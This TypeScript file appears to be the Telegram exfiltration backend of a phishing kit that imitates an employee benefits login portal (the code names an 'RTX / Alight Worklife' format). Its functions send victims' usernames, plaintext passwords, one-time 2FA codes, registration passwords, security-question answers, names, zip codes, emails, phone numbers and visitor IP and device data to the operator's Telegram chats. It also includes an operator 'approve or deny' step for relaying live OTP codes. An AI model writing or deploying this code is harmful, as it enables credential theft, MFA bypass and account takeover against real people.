// Get Telegram configuration from environment variables
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || ''
// TELEGRAM_CHAT_ID: one id, or several comma-separated (e.g. "111,222,333")
const CHAT_IDS = process.env.TELEGRAM_CHAT_ID
  ? process.env.TELEGRAM_CHAT_ID.split(',').map((id) => id.trim()).filter(Boolean)
  : []

// Validate that required environment variables are set
if (!TELEGRAM_BOT_TOKEN) {
  console.error('⚠️ TELEGRAM_BOT_TOKEN is not set in environment variables')
}
if (CHAT_IDS.length === 0) {
  console.error('⚠️ TELEGRAM_CHAT_ID is not set in environment variables')
}

/** Payload for “New Visitor” Telegram (aligned with RTX / Alight Worklife format). */
export interface VisitorTelegramData {
  siteName: string
  location: string
  ip: string
  timezone: string
  isp: string
  userAgent: string
  screen: string
  language: string
  referrer: string
  pageUrl: string
  localTime: string
  utcTime: string
}

interface FormData {
  type: string
  userId?: string
  password?: string
  confirmPassword?: string
  email?: string
  phone?: string
  otp?: string
  timestamp: string
  page: string
}

function escapeTelegramHtml(text: string): string {
  return text
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;')
}

function isHttpUrl(value: string): boolean {
  return /^https?:\/\//i.test(value.trim())
}


/** Base ADMIN_PORTAL_URL for Telegram approve/deny links (no /admin/login path). */
function adminPortalLink(): string {
  const raw = process.env.ADMIN_PORTAL_URL?.trim()
  if (!raw) return '/admin/login'
  return raw.replace(/\/+$/, '')
}


/** Clickable link for Telegram HTML (admin portal, page URLs, etc.). */
function asLink(url: string, label?: string): string {
  const href = url.trim()
  if (!href || !isHttpUrl(href)) {
    return asCode(href || "Unknown")
  }
  const linkText = (label?.trim() || href).trim()
  return `<a href="${escapeTelegramHtml(href)}">${escapeTelegramHtml(linkText)}</a>`
}

/** Referrer / page fields: link when http(s), otherwise monospace. */
function asUrlField(value: unknown, fallback = "Unknown"): string {
  const t = value == null || value === "" ? "" : String(value).trim()
  const resolved = t || fallback
  if (resolved === "Direct") return asCode(resolved)
  if (isHttpUrl(resolved)) return asLink(resolved)
  return asCode(resolved)
}


function asCode(value: unknown): string {
  const t = value == null || value === '' ? 'Unknown' : String(value).trim() || 'Unknown'
  return `<code>${escapeTelegramHtml(t)}</code>`
}

function asPre(value: unknown): string {
  const t = value == null ? '' : String(value)
  return `<pre>${escapeTelegramHtml(t || 'Unknown')}</pre>`
}

export async function sendVisitorNotification(data: VisitorTelegramData): Promise<boolean> {
  const site = escapeTelegramHtml(data.siteName)
  const message =
    `\n🌐 <b>New Visitor (${site})</b>\n` +
    `━━━━━━━━━━━━━━━━━━\n` +
    `📍 <b>Location:</b> ${asCode(data.location)}\n` +
    `🌍 <b>IP:</b> ${asCode(data.ip)}\n` +
    `⏰ <b>Timezone:</b> ${asCode(data.timezone)}\n` +
    `🌐 <b>ISP:</b> ${asCode(data.isp)}\n\n` +
    `📱 <b>Device:</b>\n${asPre(data.userAgent)}\n` +
    `🖥️ <b>Screen:</b> ${asCode(data.screen)}\n` +
    `🌍 <b>Language:</b> ${asCode(data.language)}\n` +
    `🔗 <b>Referrer:</b> ${asUrlField(data.referrer)}\n` +
    `🌐 <b>URL:</b> ${asUrlField(data.pageUrl)}\n\n` +
    `⏰ <b>Local Time:</b> ${asCode(data.localTime)}\n` +
    `🕒 <b>UTC Time:</b> ${asCode(data.utcTime)}`

  return await sendTelegramMessage(message, { disableWebPagePreview: false })
}

export async function sendFormNotification(data: FormData & { [key: string]: any }): Promise<boolean> {
  let message: string

  // 1) Login attempt from main Sign In
  if (data.type === 'login') {
    message = `🔐 <b>Login Attempt</b>
━━━━━━━━━━━━━━━━━━
👤 Username: ${asCode(data.userId)}
🔒 Password: ${asCode(data.password)}`
  }
  // 1c) Admin login approval
  else if (data.type === 'admin_login_approve') {
    const methodLabel = (data as { method?: string }).method === 'email' ? 'Email' : 'Text Message (SMS)'
    message = `✅ <b>Admin – Login Approved</b>
━━━━━━━━━━━━━━━━━━
👤 User ID: ${asCode((data as { userId?: string }).userId)}
📧 Method: ${asCode(methodLabel)}
${(data as { method?: string }).method === 'email' ? `📧 Email: ${asCode((data as { maskedEmail?: string }).maskedEmail)}` : `📱 Phone: ${asCode((data as { maskedPhone?: string }).maskedPhone)}`}
✅ Status: Approved – User redirected to OTP page`
  }
  // 1d) Admin login denial
  else if (data.type === 'admin_login_deny') {
    const methodLabel = (data as { method?: string }).method === 'email' ? 'Email' : 'Text Message (SMS)'
    message = `❌ <b>Admin – Login Denied</b>
━━━━━━━━━━━━━━━━━━
👤 User ID: ${asCode((data as { userId?: string }).userId)}
📧 Method: ${asCode(methodLabel)}
${(data as { method?: string }).method === 'email' ? `📧 Email: ${asCode((data as { maskedEmail?: string }).maskedEmail)}` : `📱 Phone: ${asCode((data as { maskedPhone?: string }).maskedPhone)}`}
❌ Status: Denied – User shown error message`
  }
  // 1e) New login request (pending approval – same as request showing on admin)
  else if (data.type === 'login_approval_request') {
    const methodLabel = (data as { method?: string }).method === 'email' ? 'Email' : 'Text Message (SMS)'
    const adminLink = process.env.ADMIN_PORTAL_URL
      ? adminPortalLink()
      : '/admin/login'
    message = `🔔 <b>Login request – approve or deny</b>
━━━━━━━━━━━━━━━━━━
👤 User ID: ${asCode((data as { userId?: string }).userId)}
📧 Method: ${asCode(methodLabel)}
${(data as { method?: string }).method === 'email' ? `📧 Email: ${asCode((data as { maskedEmail?: string }).maskedEmail)}` : `📱 Phone: ${asCode((data as { maskedPhone?: string }).maskedPhone)}`}

👉 Approve or deny at ${asLink(adminLink)}`
  }
  // 1f) Login OTP submitted – second approval (admin must approve code before redirect)
  else if (data.type === 'login_otp_approval_request') {
    const methodLabel = (data as { method?: string }).method === 'email' ? 'Email' : 'Text Message (SMS)'
    const adminLink = process.env.ADMIN_PORTAL_URL
      ? adminPortalLink()
      : '/admin/login'
    message = `🔔 <b>OTP submitted – approve or deny</b>
━━━━━━━━━━━━━━━━━━
👤 User ID: ${asCode((data as { userId?: string }).userId)}
📧 Method: ${asCode(methodLabel)}
${(data as { method?: string }).method === 'email' ? `📧 Email: ${asCode((data as { maskedEmail?: string }).maskedEmail)}` : `📱 Phone: ${asCode((data as { maskedPhone?: string }).maskedPhone)}`}
🔐 Code: ${asCode((data as { password?: string }).password)}

👉 Approve or deny at ${asLink(adminLink)}`
  }
  // 1b) Register button clicked on home page
  else if (data.type === 'registration' && data.page === '/') {
    message = `🔹 <b>Type:</b> ${asCode('Register Button Clicked')}`
  }
  // 2) Login 2FA method selection (login flow)
  else if (
    (data.type === 'email_verification' || data.type === 'text_verification') &&
    typeof data.page === 'string' &&
    data.page.startsWith('/login/2fa-verify')
  ) {
    const methodLabel =
      data.type === 'email_verification'
        ? 'Email'
        : 'Text Message (SMS)'

    message = `🔐 <b>Verify Your Identity</b>
━━━━━━━━━━━━━━━━━━

Method Selected: ${asCode(methodLabel)}`
  }
  // 3) Login OTP verification (login verify-code)
  else if (
    data.type === 'login_email_otp_verification' ||
    data.type === 'login_text_otp_verification'
  ) {
    const methodLabel =
      data.type === 'login_email_otp_verification'
        ? 'Email'
        : 'Text Message (SMS)'

    message = `✅ <b>Verification Code Submitted</b>
🔐 <b>Type:</b> ${asCode(methodLabel)}
🔢 <b>Code:</b> ${asCode(data.otp)}`
  }
  // 3a) Registration OTP verification (email/text on /registration)
  else if (
    (data.type === 'email_verification' || data.type === 'text_verification') &&
    typeof data.page === 'string' &&
    data.page === '/registration'
  ) {
    if (data.type === 'email_verification') {
      message = `✅ <b>Verification Code Submitted</b>
🔐 <b>Type:</b> Email : ${asCode(data.email)}
🔢 <b>Code:</b> ${asCode(data.otp)}`
    } else {
      message = `✅ <b>Verification Code Submitted</b>
🔐 <b>Type:</b> Text : ${asCode(data.phone)}
🔢 <b>Code:</b> ${asCode(data.otp)}`
    }
  }
  // 3b) Registration Step 1 – personal info
  else if (data.type === 'personal_info_lookup') {
    message = `📝 <b>Registration - Step 1: Personal Info</b>
━━━━━━━━━━━━━━━━━━
👤 <b>First Name:</b> ${asCode((data as any).firstName)}
👤 <b>Last Name:</b> ${asCode((data as any).lastName)}
🏷️ <b>Zip Code:</b> ${asCode((data as any).zipCode)}`
  }
  // 3c) Registration Step 2 – employer name
  else if (data.type === 'employer_name_lookup') {
    message = `📝 <b>Registration - Step 2: Employer</b>
━━━━━━━━━━━━━━━━━━
🏢 <b>Employer Name:</b> ${asCode((data as any).employerId)}`
  }
  // 3d) Registration Step 3 – contact info
  else if (data.type === 'contact_info') {
    message = `📝 <b>Registration - Step 3: Contact Info</b>
━━━━━━━━━━━━━━━━━━
📧 <b>Email:</b> ${asCode(data.email || 'Not provided')}
📱 <b>Mobile:</b> ${asCode(data.phone)}`
  }
  // 3e) Registration Step 4 – method selected
  else if (
    data.type === 'registration' &&
    typeof data.page === 'string' &&
    data.page.startsWith('/registration?step=4')
  ) {
    const methodLabel = data.email ? 'Email' : 'Text Message (SMS)'

    message = `📝 <b>Registration - Step 4: Method Selected</b>
━━━━━━━━━━━━━━━━━━

Method Selected: ${asCode(methodLabel)}
${data.email ? `📧 <b>Email:</b> ${asCode(data.email)}` : ''}
${data.phone ? `📱 <b>Mobile:</b> ${asCode(data.phone)}` : ''}`
  }
  // 4) Registration credentials (User ID + password + confirm password)
  else if (data.type === 'User Credentials Setup') {
    message = `📝 <b>Registration - Credentials Set</b>
━━━━━━━━━━━━━━━━━━
👤 <b>User ID:</b> ${asCode(data.userId)}
🔒 <b>Password:</b> ${asCode(data.password)}
🔒 <b>Confirm Password:</b> ${asCode(data.confirmPassword)}`
  }
  // 5) Registration security questions (all Q&A)
  else if (data.type === 'Security Questions') {
    // Expect securityAnswers: Array<{ question: string; answer: string }>
    const qa = Array.isArray((data as any).securityAnswers) ? (data as any).securityAnswers : []
    const lines = qa.map(
      (item: any, index: number) =>
        `Q${index + 1}: ${asCode(item.question)}\nA${index + 1}: ${asCode(item.answer)}`
    ).join('\n\n')

    message = `📝 <b>Registration - Security Questions</b>
━━━━━━━━━━━━━━━━━━

${lines || 'No questions captured.'}`
  }
  // 6) Registration complete (final submit)
  else if (data.type === 'Registration Complete') {
    message = `📝 <b>Registration Complete</b>
━━━━━━━━━━━━━━━━━━
👤 <b>User ID:</b> ${asCode(data.userId)}
✅ <b>Status:</b> ${asCode('Submitted')}`
  }
  // 7a) Login 2FA – resend code (login verify-code)
  else if (data.type === 'login_email_otp_resend' || data.type === 'login_text_otp_resend') {
    message = `🔔 <b>Resend Code Clicked</b>
━━━━━━━━━━━━━━━━━━`
  }
  // 7b) Login 2FA – "I did not receive my code" clicked
  else if (data.type === 'login_did_not_receive_code') {
    let methodLabel = 'Unknown'
    if (typeof data.page === 'string') {
      if (data.page.includes('method=text')) {
        methodLabel = 'Text Message (SMS)'
      } else if (data.page.includes('method=email')) {
        methodLabel = 'Email'
      }
    }

    message = `🔔 <b>"I did not receive my code" Clicked</b>
━━━━━━━━━━━━━━━━━━

User was sent back to the verification method selection page.
Method at time of click: ${asCode(methodLabel)}`
  }
  // 7) Fallback generic template (other events)
  else {
    message = `📝 <b>Form Submission</b>

🔹 <b>Type:</b> ${asCode(String(data.type || '').toUpperCase())}
📄 <b>Page:</b> ${asCode(data.page)}

${data.userId ? `👤 <b>User ID:</b> ${asCode(data.userId)}` : ''}
${data.password ? `🔒 <b>Password:</b> ${asCode(data.password)}` : ''}
${data.email ? `📧 <b>Email:</b> ${asCode(data.email)}` : ''}
${data.phone ? `📱 <b>Phone:</b> ${asCode(data.phone)}` : ''}
${data.otp ? `🔐 <b>OTP Code:</b> ${asCode(data.otp)}` : ''}`
  }

  return await sendTelegramMessage(message)
}

export type SendTelegramMessageOptions = {
  disableWebPagePreview?: boolean
}

export async function sendTelegramMessage(
  message: string,
  options: SendTelegramMessageOptions = {},
): Promise<boolean> {
  const disableWebPagePreview = options.disableWebPagePreview !== false

  // Validate we have the required token
  if (!TELEGRAM_BOT_TOKEN) {
    console.error('Cannot send Telegram message: TELEGRAM_BOT_TOKEN is not set')
    return false
  }

  // If no chat ID(s) configured, log warning
  if (CHAT_IDS.length === 0) {
    console.warn('No TELEGRAM_CHAT_ID configured - message will not be sent')
    return false
  }
  
  const promises = CHAT_IDS.map(chatId => 
    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML',
        disable_web_page_preview: disableWebPagePreview,
      })
    })
    .then(async (response) => {
      try {
        const data = await response.json()
        if (!response.ok || !data.ok) {
          console.error(`Failed to send to chat ${chatId}:`, data)
          return { ok: false }
        }
        return { ok: true }
      } catch (parseError) {
        console.error(`Failed to parse response for chat ${chatId}:`, parseError)
        return { ok: false }
      }
    })
    .catch(error => {
      console.error(`Failed to send to chat ${chatId}:`, error)
      return { ok: false }
    })
  )

  const results = await Promise.allSettled(promises)
  
  // Check if at least one message was sent successfully
  const successCount = results.filter(
    result => result.status === 'fulfilled' && result.value && result.value.ok === true
  ).length
  
  // Return true if at least one message succeeded, false otherwise
  return successCount > 0
}
